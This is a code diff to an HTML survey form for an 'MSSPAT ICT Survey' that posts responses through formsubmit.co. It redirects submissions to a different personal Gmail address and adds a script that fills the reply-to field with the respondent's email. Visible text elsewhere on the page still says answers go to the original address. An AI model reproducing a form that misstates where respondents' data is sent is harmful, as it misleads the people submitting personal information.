@@ -245,8 +245,8 @@
         <span class="email-badge">📬 All answers will be emailed to dynatechsln@gmail.com</span>
     </div>
 
-    <form action="https://formsubmit.co/dynatechsln@gmail.com" method="POST">
-        <input type="hidden" name="_replyto" value="dynatechsln@gmail.com">
+    <form action="https://formsubmit.co/christinamgoji26@gmail.com" method="POST">
+        <input type="hidden" name="_replyto" value="">
         <input type="hidden" name="_captcha" value="false">
         <input type="hidden" name="_subject" value="MSSPAT ICT Survey Response - Full Form">
         <input type="hidden" name="_template" value="table">
@@ -890,6 +890,12 @@
         MSSPAT · All Regulation 13A ICT questions included · Responses sent to dynatechsln@gmail.com
     </div>
 </div>
+    <script>
+document.querySelector("form").addEventListener("submit", function() {
+    const email = document.querySelector('input[name="email_address"]').value;
+    document.querySelector('input[name="_replyto"]').value = email;
+});
+</script>
 </body>
 </html>
 
